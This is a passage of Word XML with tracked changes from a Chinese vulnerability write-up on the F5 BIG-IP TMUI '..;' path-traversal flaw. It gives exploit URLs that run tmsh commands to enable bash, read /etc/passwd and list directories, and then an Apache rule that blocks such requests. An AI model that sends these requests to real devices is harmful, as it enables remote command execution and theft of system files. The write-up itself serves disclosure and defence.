          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="451" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>登录进去后的页面是这样的</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:bookmarkStart w:id="452" w:name="_Toc45275522"/>
        <w:bookmarkStart w:id="453" w:name="_Toc45275558"/>
        <w:bookmarkStart w:id="454" w:name="_Toc45275594"/>
        <w:bookmarkEnd w:id="452"/>
        <w:bookmarkEnd w:id="453"/>
        <w:bookmarkEnd w:id="454"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="370BDCE6" w14:textId="4DBFE7A6" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="455" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="456" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="457" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Microsoft YaHei UI" w:eastAsia="Microsoft YaHei UI" w:hAnsi="Microsoft YaHei UI" w:hint="eastAsia"/>
            <w:noProof/>
            <w:color w:val="333333"/>
            <w:spacing w:val="8"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67CFC7F1" wp14:editId="293651AD">
              <wp:extent cx="5731510" cy="2280970"/>
              <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
              <wp:docPr id="6" name="Picture 6" descr="A screenshot of a social media pos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4.pn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28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458" w:name="_Toc45275523"/>
        <w:bookmarkStart w:id="459" w:name="_Toc45275559"/>
        <w:bookmarkStart w:id="460" w:name="_Toc45275595"/>
        <w:bookmarkEnd w:id="458"/>
        <w:bookmarkEnd w:id="459"/>
        <w:bookmarkEnd w:id="460"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="5D2621F8" w14:textId="4F34D38E" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="461" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="462" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="463" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1.</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>开启</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>bash</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>使用的命令：</w:t>
        </w:r>
        <w:bookmarkStart w:id="464" w:name="_Toc45275524"/>
        <w:bookmarkStart w:id="465" w:name="_Toc45275560"/>
        <w:bookmarkStart w:id="466" w:name="_Toc45275596"/>
        <w:bookmarkEnd w:id="464"/>
        <w:bookmarkEnd w:id="465"/>
        <w:bookmarkEnd w:id="466"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="1AF20CB3" w14:textId="38A4D04B" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="467" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="468" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="469" w:name="_Toc45275525"/>
      <w:bookmarkStart w:id="470" w:name="_Toc45275561"/>
      <w:bookmarkStart w:id="471" w:name="_Toc45275597"/>
      <w:bookmarkEnd w:id="469"/>
      <w:bookmarkEnd w:id="470"/>
      <w:bookmarkEnd w:id="471"/>
    </w:p>
    <w:p w14:paraId="52DDEE31" w14:textId="5C62D1F9" w:rsidR="00422B7D" w:rsidRPr="00600CAB" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="472" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:pPrChange w:id="473" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="474" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="00600CAB" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</w:t>
        </w:r>
        <w:bookmarkStart w:id="475" w:name="_Toc45275526"/>
        <w:bookmarkStart w:id="476" w:name="_Toc45275562"/>
        <w:bookmarkStart w:id="477" w:name="_Toc45275598"/>
        <w:bookmarkEnd w:id="475"/>
        <w:bookmarkEnd w:id="476"/>
        <w:bookmarkEnd w:id="477"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="2707AC5D" w14:textId="02407844" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="478" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="479" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="480" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="23E82D9F" wp14:editId="1D2AE316">
              <wp:extent cx="5731510" cy="641121"/>
              <wp:effectExtent l="0" t="0" r="2540" b="698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4.png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411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481" w:name="_Toc45275527"/>
        <w:bookmarkStart w:id="482" w:name="_Toc45275563"/>
        <w:bookmarkStart w:id="483" w:name="_Toc45275599"/>
        <w:bookmarkEnd w:id="481"/>
        <w:bookmarkEnd w:id="482"/>
        <w:bookmarkEnd w:id="483"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="6C6C281A" w14:textId="09416C65" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="484" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="485" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="486" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2.</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>读取文件</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>PoC</w:t>
        </w:r>
        <w:bookmarkStart w:id="487" w:name="_Toc45275528"/>
        <w:bookmarkStart w:id="488" w:name="_Toc45275564"/>
        <w:bookmarkStart w:id="489" w:name="_Toc45275600"/>
        <w:bookmarkEnd w:id="487"/>
        <w:bookmarkEnd w:id="488"/>
        <w:bookmarkEnd w:id="489"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="0C4B4FC1" w14:textId="2DE80F06" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="490" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="491" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="492" w:name="_Toc45275529"/>
      <w:bookmarkStart w:id="493" w:name="_Toc45275565"/>
      <w:bookmarkStart w:id="494" w:name="_Toc45275601"/>
      <w:bookmarkEnd w:id="492"/>
      <w:bookmarkEnd w:id="493"/>
      <w:bookmarkEnd w:id="494"/>
    </w:p>
    <w:p w14:paraId="403F5E94" w14:textId="03FC303B" w:rsidR="00422B7D" w:rsidRPr="00852434" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="495" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:pPrChange w:id="496" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="497" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="00852434" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
        </w:r>
        <w:bookmarkStart w:id="498" w:name="_Toc45275530"/>
        <w:bookmarkStart w:id="499" w:name="_Toc45275566"/>
        <w:bookmarkStart w:id="500" w:name="_Toc45275602"/>
        <w:bookmarkEnd w:id="498"/>
        <w:bookmarkEnd w:id="499"/>
        <w:bookmarkEnd w:id="500"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="5A1C27D5" w14:textId="5A93381F" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="501" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="502" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="503" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="115690EC" wp14:editId="41025D9D">
              <wp:extent cx="5731510" cy="1048940"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="8" name="Picture 8" descr="A screenshot of a social media pos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4.png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048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504" w:name="_Toc45275531"/>
        <w:bookmarkStart w:id="505" w:name="_Toc45275567"/>
        <w:bookmarkStart w:id="506" w:name="_Toc45275603"/>
        <w:bookmarkEnd w:id="504"/>
        <w:bookmarkEnd w:id="505"/>
        <w:bookmarkEnd w:id="506"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="05310EF1" w14:textId="5CDCDD65" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="507" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="508" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="509" w:name="_Toc45275532"/>
      <w:bookmarkStart w:id="510" w:name="_Toc45275568"/>
      <w:bookmarkStart w:id="511" w:name="_Toc45275604"/>
      <w:bookmarkEnd w:id="509"/>
      <w:bookmarkEnd w:id="510"/>
      <w:bookmarkEnd w:id="511"/>
    </w:p>
    <w:p w14:paraId="4616F0FE" w14:textId="04730C94" w:rsidR="00422B7D" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="512" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="513" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="514" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>3.</w:t>
        </w:r>
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>列出所有文件</w:t>
        </w:r>
        <w:bookmarkStart w:id="515" w:name="_Toc45275533"/>
        <w:bookmarkStart w:id="516" w:name="_Toc45275569"/>
        <w:bookmarkStart w:id="517" w:name="_Toc45275605"/>
        <w:bookmarkEnd w:id="515"/>
        <w:bookmarkEnd w:id="516"/>
        <w:bookmarkEnd w:id="517"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="79281803" w14:textId="4862DCED" w:rsidR="00422B7D" w:rsidRPr="008F0249" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="518" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:pPrChange w:id="519" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="520" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="008F0249" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</w:t>
        </w:r>
        <w:bookmarkStart w:id="521" w:name="_Toc45275534"/>
        <w:bookmarkStart w:id="522" w:name="_Toc45275570"/>
        <w:bookmarkStart w:id="523" w:name="_Toc45275606"/>
        <w:bookmarkEnd w:id="521"/>
        <w:bookmarkEnd w:id="522"/>
        <w:bookmarkEnd w:id="523"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="122E1FD5" w14:textId="1B4918EF" w:rsidR="00422B7D" w:rsidRPr="0054236F" w:rsidDel="00EA14FB" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveFrom w:id="524" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="525" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveFrom w:id="526" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12CE2C80" wp14:editId="0A8DE386">
              <wp:extent cx="5731510" cy="1206924"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="9" name="Picture 9" descr="A picture containing table, display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4.png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2069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527" w:name="_Toc45275535"/>
        <w:bookmarkStart w:id="528" w:name="_Toc45275571"/>
        <w:bookmarkStart w:id="529" w:name="_Toc45275607"/>
        <w:bookmarkEnd w:id="527"/>
        <w:bookmarkEnd w:id="528"/>
        <w:bookmarkEnd w:id="529"/>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="0E87E1DC" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:bookmarkStart w:id="530" w:name="_Toc45275608"/>
      <w:moveFromRangeEnd w:id="407"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>防御措施</w:t>
      </w:r>
      <w:bookmarkEnd w:id="530"/>
    </w:p>
    <w:p w14:paraId="73396485" w14:textId="5B9C3D42" w:rsidR="00E24169" w:rsidRPr="00E24169" w:rsidRDefault="00E24169">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="531" w:author="芮志清" w:date="2020-07-10T12:03:00Z"/>
          <w:rPrChange w:id="532" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
            <w:rPr>
              <w:ins w:id="533" w:author="芮志清" w:date="2020-07-10T12:03:00Z"/>
              <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              <w:highlight w:val="yellow"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="534" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="535" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
        <w:r w:rsidRPr="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:rPrChange w:id="536" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>在</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>W</w:t>
        </w:r>
        <w:r>
          <w:t>eb</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>服务器的配置文件中添加</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="537" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>以下规则</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="538" w:author="芮志清" w:date="2020-07-10T12:03:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0DF0603C" w14:textId="354355A5" w:rsidR="00422B7D" w:rsidRPr="00485A79" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>include ‘&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>LocationMatch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>".*</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>\.\.;.*"&gt;Redirect 404 /&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>LocationMatch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB35A2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&gt;’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A890D2" w14:textId="2DA59F7C" w:rsidR="00422B7D" w:rsidRPr="007B7658" w:rsidRDefault="00E24169">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:pPrChange w:id="539" w:author="芮志清" w:date="2020-07-10T11:32:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="540" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>此</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="541" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>这个</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>规则的</w:t>
      </w:r>
      <w:ins w:id="542" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>含义为</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="543" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>意思是</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="544" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="545" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>服务器在监测到</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中包含</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.;(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>句号句号分号</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的时候，直接返回</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>404</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:ins w:id="546" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>通过此种方式，可</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="547" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>阻止</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="548" w:author="芮志清" w:date="2020-07-10T12:04:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>这样</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用漏洞的请求</w:t>
      </w:r>
      <w:del w:id="549" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>就没办法</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>到达后台</w:t>
      </w:r>
      <w:del w:id="550" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>(</w:delText>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>第二层</w:delText>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>了</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C8BCE1" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:bookmarkStart w:id="551" w:name="_Toc45275609"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>总结</w:t>
      </w:r>
      <w:bookmarkEnd w:id="551"/>
    </w:p>
    <w:p w14:paraId="5A02CF7D" w14:textId="0F540520" w:rsidR="00422B7D" w:rsidDel="000A184D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:del w:id="552" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="553" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
        <w:r w:rsidDel="000A184D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
